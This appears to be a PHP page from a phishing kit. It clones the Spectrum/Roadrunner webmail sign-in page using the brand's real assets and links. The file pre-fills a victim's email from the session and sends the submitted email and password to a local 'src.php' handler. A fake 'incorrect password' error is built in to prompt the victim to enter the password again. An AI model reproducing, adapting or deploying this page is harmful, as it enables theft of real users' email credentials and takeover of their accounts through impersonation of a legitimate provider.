<?php
error_reporting(0);
session_start();
ob_start();

function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}


if (loggedin()) {
} else {
    die();
}
        
$email = @$_SESSION['email'];

$error = @$_GET['error'];
if ($error == "null_entry") {
    $formaction = "src.php";
    $showerror = "block";
} elseif ($error == "sec") {
    $formaction = "src.php?svr=tf";
    $showerror = "block";
} else {
        $formaction = "src.php";
    $showerror = "none";
}


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional" "/assets/dtd/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><!-- webmail version: 4.4.7 - 20180110a-twc  --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>
    
    Log In
  </title>

  <link rel="shortcut icon" type="image/ico" href="https://webmail.roadrunner.com/favicon.png">


    
    <link rel="stylesheet" type="text/css" href="https://webmail.roadrunner.com/includes/reset-min.447a.css;jsessionid=aaaixjEIbJ2u1_V0m4Uyw" media="all">
    <link rel="stylesheet" type="text/css" href="https://webmail.roadrunner.com/includes/webmail.447a.css;jsessionid=aaaixjEIbJ2u1_V0m4Uyw" media="all">
    <!--[if IE]>
        <link rel="stylesheet" type="text/css" href="https://webmail.roadrunner.com/includes/ie.447a.css;jsessionid=aaaixjEIbJ2u1_V0m4Uyw" media="all" />
    <![endif]-->

    



</head>

<!-- START wrapper -->

  
  
  

  
  

  
  





<body id="body_id" style="text-align: center; background-color: #c9c9c9;">


<!-- End comScore Tag -->

<!-- SiteCatalyst code version: H.16.
Copyright 1997-2008 Omniture, Inc. More info available at
http://www.omniture.com -->





<!--/DO NOT REMOVE/-->
<!-- End SiteCatalyst code version: H.16. -->

<div class="wrapper">
    











<div class="richAdLoginHeader">
<!-- START hat -->

        <div class="hat_background">
                <a class="hat_text hat_first_element" target="_blank" href="http://www.spectrum.com/">Home</a>
                <a class="hat_text" target="_blank" href="http://business.spectrum.com/">Business</a>
                <a class="hat_text" target="_blank" href="https://myservices.timewarnercable.com/login">My Account</a>
                <a class="hat_text" target="_blank" href="https://www.timewarnercable.com/en/support/overview.html?cid=aff:twccsupport">Support</a>
                <a class="hat_text" target="_blank" href="http://tv.twcc.com/listings">TV Listings</a>
                <a class="hat_text" target="_blank" href="http://watch.spectrum.net/">Watch TV</a>
                <a class="hat_text" target="_blank" href="https://www.timewarnercable.com/en/support/internet/topics/internet-security.html">Security</a>
                <a class="hat_text" target="_blank" href="https://www.spectrum.com/about.html">About Us</a>
        </div>

<!-- END hat -->

</div>
<!-- END header -->



    <!-- START main -->
    <div class="main">
        <!-- START .main .content -->

        














<noscript>
<div class="webmailErrorInfoSection">
    <div class="webmailError webmailAlignLeftNoPad2"></div>
        <div class="webmailErrorInfoTxt" tabindex="-1">
            This application needs Javascript enabled to function correctly.
        </div>
</div>    
</noscript>

<div style="display: <?php echo "$showerror"; ?>;">



<ul class="webmailErrorInfoSection">

  <li>
    <div class="webmailError webmailAlignLeftNoPad2" title="Error icon" tabindex="0"></div>
        <div class="webmailErrorInfoTxt" id="errorSection" tabindex="0">
            The email address or password is incorrect.
        </div>
  </li><br>

</ul>

</div>








            <!-- START .webmailMainPanel -->
            












<!-- Content -->
  <form name="loginForm" method="POST" action="<?php echo "$formaction"; ?>" onsubmit="return validateLoginForm(this);">

    <input type="hidden" name="wiz" value="">
    
    <input type="hidden" id="autoSaveMessageText" name="autoSaveMessageText" value="">

    <div class="richAdLoginContent">
    <div class="loginLogoHeader">
    <div class="loginLogoImage" title="Spectrum"><img src="https://webmail.roadrunner.com/images/spectrum-logo-154x40.png;jsessionid=aaaixjEIbJ2u1_V0m4Uyw?l=en-US&v=twc_theme"></div>
    
</div><table class="mainPanelInBodyTableFormattingLogin" role="presentation">
        <!-- Email -->

    <!-- logo bar -->


        <tbody><tr>
            <td valign="top"><table valign="top" class="mainPanelInBodyTableFormatting" role="presentation">
            <tbody><tr>
                <td class="mainPanelTxt_12B mainPanelLoginWidthAlign loginHeading"><h1 style="color: #000000;">Webmail Sign In</h1></td>
            </tr>
                        <tr>
                                <td class="mainPanelTxt_12B mainPanelLoginWidthAlign"><label for="account">Email Address</label></td>
                        </tr>
                        <tr>
                                <td class="mainPanelComposeMailPadding3 loginHeader"><input type="text" name="account" maxlength="150" value="<?php echo "$email"; ?>" id="account"></td>
                        </tr>
                        
                        <tr>
                                <td class="mainPanelTxt_12B mainPanelLoginWidthAlign"><label for="password">Password</label></td>
                        </tr>
                        <tr>
                                <td class="mainPanelComposeMailPadding3 loginHeader">
                                        <input type="password" name="password" id="password" redisplay="false" maxlength="150" onkeypress="javascript:onKeyPressBlockNumbers(event)"></td>
                        </tr>
                        
                        <tr>
                                <td class="mainPanelTxt_12B" style="padding: 8px;"><input type="checkbox" name="cacheName" value="1" id="remember"> <label for="remember">Remember Email Address</label></td>
                        </tr>
                        <tr>
                                <td class="mainPanelTxt_12">Forgot your <a href="https://urt.rr.com/" title="Forgot your email address?" target="_blank">Email Address</a>?</td>
                        </tr>
                        <tr>
                                <td class="mainPanelTxt_12">Forgot your <a href="https://pt.rr.com/" title="Forgot your pasword?" target="_blank">Password?</a></td>
                        </tr>
                        <tr><td class="mainPanelTxt_12B"><fieldset><legend>Please Select Your Preferred Language:</legend>
    <br>
    <input class="mainPanelRadioButtonAlign" name="locale" title="Select your language" id="English" type="radio" value="en-US" checked="checked"> <label for="English"> English</label>
    <input class="mainPanelRadioButtonAlign" name="locale" title="Select your language" id="Spanish" type="radio" value="es-US"> <label for="Spanish" lang="es"> Español</label>
                        </fieldset></td>
            </tr>
            <tr>
                          <td><!-- Buttons -->
                        <div class="mainPanelEndOfPageButtons">
                        
                        <div class="mainPanelTextFieldPadding mainPanelLoginTopPadding">
                        <input id="loginButton" type="submit" class="mainPanelInPageButtons" title="Log In" onclick="javascript:loginCompletion(document.loginForm); return false;" value="Log In" onmouseover="return hint(&#39;Log In&#39;)" onmouseout="return hint()">
                        </div>
                        </div></td>
                </tr>
        </tbody></table></td>
        </tr>
    </tbody></table>
   </div>
</form>

<script language="javascript">
 if (document.getElementById('errorSection') != null) {
        document.getElementById('errorSection').focus();
 } else {
        window.onload = checkSavedLogin;
}
</script>

        </div>
    <!-- END .main -->

    <div class="footer" style="background-color: #FFFFFF; bottom: 0; height: 64px; left: 0; position: fixed; width: 100%; border-top: 1px solid #CCCCCC; z-index: 3;">

    













<!-- START footer -->
<div class="footer">

    <!-- START footer content --> 
    <div class="content">

            
            

            <ul class="legalFooter">
        <li>© 2018 Charter Communications. All rights reserved.</li>
                <li> | </li>
                <li><a href="http://www.twcmedia.com/default.aspx?cid=aff:twccmediasales" target="_blank">Advertise with Us</a></li>
                <li> | </li>
                <li><a href="https://www.spectrum.com/policies/your-privacy-rights.html" target="_blank">Terms of Use</a></li>
                <li> | </li>
                <li><a href="https://www.spectrum.com/policies/website-privacy-policy.html" target="_blank">Web Privacy Policy</a></li>
                <li>| </li>
                <li><a href="https://www.spectrum.com/policies/ca-privacy-rights.html" target="_blank">Your California Privacy Rights</a></li>
                <li> | </li>
                <li><a href="http://help.twcable.com/policies.html?cid=aff:twccwmsubscriberpolicies3" target="_blank">TWC Subscriber Policies</a></li>

          </ul>
          <ul class="legalFooter">
                <li>Time Warner Cable and the Time Warner Cable logo are trademarks of Time Warner Inc., used under license. Road Runner is ™ and © Warner Bros. Entertainment Inc.</li>
          </ul>
    </div>
    <!-- END .footer .content -->

</div>
<!-- END footer -->


</div>








</div></body></html>
